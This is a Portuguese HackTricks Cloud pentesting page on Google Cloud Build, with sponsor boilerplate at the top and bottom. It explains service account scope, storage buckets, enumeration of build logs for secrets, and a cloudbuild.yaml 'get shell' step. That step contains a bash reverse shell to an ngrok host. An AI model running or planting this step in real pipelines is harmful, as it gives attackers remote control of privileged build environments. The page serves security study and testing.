# GCP - Cloud Build

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Informa√ß√µes b√°sicas

O Google Cloud Build √© uma plataforma de CI/CD gerenciada que **automatiza o processo de constru√ß√£o de software** e de lan√ßamento, integrando-se com **reposit√≥rios de c√≥digo-fonte** e suportando uma ampla gama de linguagens de programa√ß√£o. Ele **permite que os desenvolvedores construam, testem e implantem c√≥digo automaticamente** enquanto fornece flexibilidade para personalizar etapas de constru√ß√£o e fluxos de trabalho.

Cada Cloud Build Trigger est√° **relacionado a um Reposit√≥rio do Cloud ou conectado diretamente a um reposit√≥rio externo** (Github, Bitbucket ou Gitlab).

√â poss√≠vel configurar um Cloud Build para **exigir aprova√ß√µes para execu√ß√µes de constru√ß√£o** (desativado por padr√£o).

A **Conta de Servi√ßo tem o escopo `cloud-platform`**, ent√£o ela pode **usar todos os privil√©gios**. Se **nenhuma SA for especificada** (como ao fazer submit), a **SA padr√£o** `<proj-number>@cloudbuild.gserviceaccount.com` ser√° **usada**.

{% hint style="success" %}
N√£o consegui ver nenhuma maneira de roubar o token do Github/Bitbucket daqui ou dos Reposit√≥rios do Cloud porque quando o reposit√≥rio √© baixado, ele √© acessado por meio de uma URL [https://source.cloud.google.com/](https://source.cloud.google.com/) e o Github n√£o √© acessado pelo cliente.
{% endhint %}

### Armazenamento

√Äs vezes, o Cloud Build ir√° **gerar um novo armazenamento para armazenar os arquivos para o trigger**. Isso acontece, por exemplo, no exemplo que o GCP oferece com:

```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
  cd cloud-console-sample-build && \
  gcloud builds submit --config cloudbuild.yaml --region=global
```

Um bucket de armazenamento chamado [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) √© criado para armazenar um `.tgz` com os arquivos a serem usados.

### Obter shell

```yaml
steps:
  - name: bash
    script: |
      #!/usr/bin/env bash
      bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
  logging: CLOUD_LOGGING_ONLY
```

### Enumera√ß√£o

Voc√™ pode encontrar **informa√ß√µes sens√≠veis nas configura√ß√µes e logs de constru√ß√£o**.

```bash
gcloud builds list
gcloud builds describe <build-uuid> # Obtenha at√© mesmo o yaml de constru√ß√£o se definido l√°
gcloud builds log <build-uuid> # Obtenha logs de constru√ß√£o
```

## Escala√ß√£o de privil√©gios

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>